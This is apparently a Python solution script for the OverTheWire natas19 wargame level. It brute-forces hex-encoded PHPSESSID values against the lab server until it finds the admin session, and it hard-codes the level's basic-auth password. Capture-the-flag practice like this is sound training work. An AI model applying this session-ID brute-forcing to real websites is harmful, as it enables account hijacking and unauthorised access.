"""
3237392d31
3536362d31
3237302d31
3?3???2d31
"""
from requests import post
from requests.auth import HTTPBasicAuth

address = 'http://natas19.natas.labs.overthewire.org/index.php?debug'
auth_data = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
print('c1')
for c1 in range(29, 40):
    request = f'{c1}2d31'
    result = post(address, auth=auth_data, data={'username': 'admin', 'password': '1'},
                  cookies={'PHPSESSID': request})
    # print(result.text)
    if 'regular' not in result.text:
        print(request)
        exit(1)
print(2)
for c1 in range(29, 40):
    for c2 in range(29, 40):
        request = f'{c1}{c2}2d31'
        result = post(address, auth=auth_data, data={'username': 'admin', 'password': '1'},
                      cookies={'PHPSESSID': request})
        if 'regular' not in result.text:
            print(request)
            exit(1)
print(3)
for c1 in range(29, 40):
    for c2 in range(29, 40):
        for c3 in range(29, 40):
            request = f'{c1}{c2}{c3}2d31'
            result = post(address, auth=auth_data, data={'username': 'admin', 'password': '1'},
                          cookies={'PHPSESSID': request})
            if 'regular' not in result.text:
                print(request)
                exit(1)

# for x in range(0, 9):
#     result = post(address, auth=auth_data, data={'username': '1', 'password': '1'})
#     print(result.cookies)
